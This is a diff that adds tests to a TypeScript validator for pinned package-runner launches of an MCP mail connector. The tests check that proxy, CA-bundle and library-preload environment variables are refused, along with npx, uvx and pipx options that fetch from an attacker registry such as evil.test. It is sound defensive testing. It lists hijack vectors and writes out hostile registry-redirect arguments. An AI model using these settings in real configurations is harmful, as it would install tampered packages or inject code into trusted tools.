@@ -106,6 +106,50 @@ verifies("app.package-runner-launch", () => {
     }
   });
 
+  it("refuses a proxy, certificate or preload variable, each with its own reason", () => {
+    expect(refused(stdio({ pin, env: { HTTPS_PROXY: "http://proxy.example.com" } }))).toBe(
+      "the connector's environment sets HTTPS_PROXY, which could send the registry's answers through another server",
+    );
+    for (const name of ["http_proxy", "All_Proxy"]) {
+      expect(refused(stdio({ pin, env: { [name]: "x" } })), name).toContain("another server");
+    }
+    for (const name of ["NODE_EXTRA_CA_CERTS", "ssl_cert_file", "REQUESTS_CA_BUNDLE"]) {
+      expect(refused(stdio({ pin, env: { [name]: "x" } })), name).toBe(
+        `the connector's environment sets ${name}, which could make the runner trust a server that only claims to be the registry`,
+      );
+    }
+    for (const name of ["LD_PRELOAD", "dyld_insert_libraries"]) {
+      expect(refused(stdio({ pin, env: { [name]: "x" } })), name).toBe(
+        `the connector's environment sets ${name}, which could load other code into the runner before the pinned package`,
+      );
+    }
+  });
+
+  it("refuses a pinned runner with an option that fetches from another registry", () => {
+    expect(
+      refused(stdio({ pin, args: ["--registry=https://evil.test", "-y", "@acme/mail-mcp"] })),
+    ).toBe(
+      "the command sets --registry=https://evil.test, which could fetch the pinned package from somewhere other than https://registry.npmjs.org",
+    );
+    const refusedArgs: [string, string[]][] = [
+      ["npx", ["--userconfig", "./evil.npmrc", "-y", "@acme/mail-mcp"]],
+      ["npx", ["--@acme:registry=https://evil.test", "@acme/mail-mcp"]],
+      ["npm", ["exec", "--Registry", "https://evil.test", "@acme/mail-mcp"]],
+      ["uvx", ["--index-url", "https://evil.test/simple", "@acme/mail-mcp"]],
+      ["uvx", ["--extra-index-url=https://evil.test/simple", "@acme/mail-mcp"]],
+      ["uvx", ["--default-index", "https://evil.test/simple", "@acme/mail-mcp"]],
+      ["uvx", ["--find-links", "./wheels", "@acme/mail-mcp"]],
+      ["uvx", ["-i", "https://evil.test/simple", "@acme/mail-mcp"]],
+      ["pipx", ["run", "--pip-args=--index-url=https://evil.test", "@acme/mail-mcp"]],
+      ["cmd", ["/c", "npx --registry=https://evil.test -y @acme/mail-mcp"]],
+    ];
+    for (const [command, args] of refusedArgs) {
+      expect(refused(stdio({ pin, command, args })), `${command} ${args.join(" ")}`).toContain(
+        "could fetch the pinned package from somewhere other than",
+      );
+    }
+  });
+
   it("finds a runner that a shell starts", () => {
     const wrapped: [string, string[]][] = [
       ["cmd", ["/c", "npx", "-y", "@acme/mail-mcp"]],
@@ -171,6 +215,21 @@ describe("checkPackageRunnerLaunch", () => {
   it("names every blocked variable in one refusal", () => {
     const env = { NODE_OPTIONS: "x", MAIL_ACCOUNT: "work", UV_INDEX_URL: "y" };
     expect(refused(stdio({ pin, env }))).toContain("sets NODE_OPTIONS, UV_INDEX_URL,");
+  });
+
+  it("names every registry option in one refusal, and lets a registry variable without a pin pass", () => {
+    const args = ["--registry", "https://evil.test", "--cache=./cache", "@acme/mail-mcp"];
+    expect(refused(stdio({ pin, args }))).toContain("sets --registry, --cache=./cache,");
+    const unpinned = stdio({ args, env: { HTTPS_PROXY: "http://proxy.example.com" } });
+    expect(checkPackageRunnerLaunch(unpinned)).toEqual({ ok: true, value: null });
+  });
+
+  it("lets a pinned runner pass with options that don't move the registry", () => {
+    const args = ["-y", "@acme/mail-mcp", "--inbox", "work", "--format=json"];
+    expect(checkPackageRunnerLaunch(stdio({ pin, args, env: { NO_PROXY: "x" } }))).toEqual({
+      ok: true,
+      value: pin,
+    });
   });
 
   it("checks a PyPI runner's packages the way PyPI names them", () => {
